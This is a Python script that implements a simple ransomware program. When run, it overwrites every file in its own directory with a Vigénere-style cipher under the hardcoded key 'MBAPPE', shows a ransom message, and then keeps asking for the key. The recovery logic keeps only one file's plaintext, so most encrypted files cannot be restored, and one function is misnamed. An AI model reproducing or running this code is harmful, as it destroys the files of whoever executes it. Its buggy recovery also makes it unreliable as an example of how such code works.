import os
import sys
import base64
import logging
import pyperclip




#!/usr/bin/env python
from math import fmod

# The minimum and maximum valid char, ascii table defined order
ascii_min = ord(' ')
ascii_max = ord('~')

def decrypt_vigenere(phrase, key):
# Generate a string of all the possible chars
    alpha = ""
    for printable in range(ascii_min, ascii_max+1):
        alpha = alpha + chr(printable)

    # Ensure the key is at least as long as the ciphertext by cat'ing it
    while len(key) < len(phrase):
        key = key + key
        key = key[0:len(phrase)]

    out = ""
    for i in range(len(phrase)):
        index_from_phrase = (ord(phrase[i])-ascii_min)
        index_from_key = ord(key[i]) - ascii_min
        difference = (index_from_phrase - index_from_key)

        # We want the sign of the dividend so we use fmod()
        # Use the inverse of this result (I'm not certain why - is there a simpler way?
        intersect = int(fmod(index_from_phrase - index_from_key, (ascii_max - ascii_min + 1)) * -1)

        letter = alpha[intersect]
        out += letter

    return out, key



class RansomWare:
    def __init__(self, name):
        self._name=name
    
    @property
    def name(self):
        return self._name
    
    @property
    def secret_key(self):
        #return "MBAPPE_SE_QUEDA_TOP_S3CR3T" 
        return "MBAPPE"

    @name.setter
    def name(self, n_name):
        self._name= n_name

    def enter_key(self):
        return input("You must enter the key: ")
    
    def about_ransom(self):
        print(
            "Your file was encrypted,\n"
            "therefore you must enter\n"
            "the key to be able to use it\n"
            
        )

    def encrypt_a_file(self, filename):
        with open(filename,'r') as file:
            text = file.read()
        
        with open("copy.txt",'w') as file:
            file.write(text)

        encrypted_file, key2 = decrypt_vigenere(text, self.secret_key)

        with open(filename,'w') as file:
            file.write(str(encrypted_file))
        
    def decrypt_a_file(self, key, filename):
        with open(filename,'r') as file:
            text = file.read()
        with open("copy.txt",'r') as file:
            original_text = file.read()

        decrypted_file, key2 = decrypt_vigenere(text, key)
        
        if(decrypted_file == original_text):
            print("You saved your files, it's a miracle")
            with open(filename,'w') as file:
                file.write(str(decrypted_file))
            return True
        else:
            print("!!!!!!!!!WRONG KEY!!!!!!!!ヽ(ಠ_ಠ)ノ")
            return False
        

    def get_files(self, path):
        files = []
        for file in os.listdir(path):

            if file == sys.argv[0] or file=="prueba.py" or file=="copy.txt":
                continue
            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)
        return files

    def encrypt_files(self, path):
        cont_files_dead=0
        files = self.get_files(path)
        
        for file in files:
            logging.debug('Encrypting this file:{}'.format(file))
            self.encrypt_a_file(file)
            cont_files_dead+=1
        self.about_ransom()
        return cont_files_dead

    def decrypt_files(self, path):
        key = self.enter_key()

        #if key != self.secret_key:
         #   print("!!!!!!!!!WRONG KEY!!!!!!!!ヽ(ಠ_ಠ)ノ")
          #  return
        files = self.get_files(path)

        for file in files:
            flag = self.decrypt_a_file(key, file)
        return flag
        

if __name__ == '__main__':

    
    ransom = RansomWare('PruebaRansomWare')
    intentos=10
    i=0
    
    logging.basicConfig(level=logging.DEBUG)
    path = os.path.dirname(os.path.abspath(__file__))
    number_of_files = ransom.encrypt_files(path)
    print("Number of encrypted files: {}".format(number_of_files))
    while True:
        flag = ransom.decrypt_files(path)
        if flag == True:
            break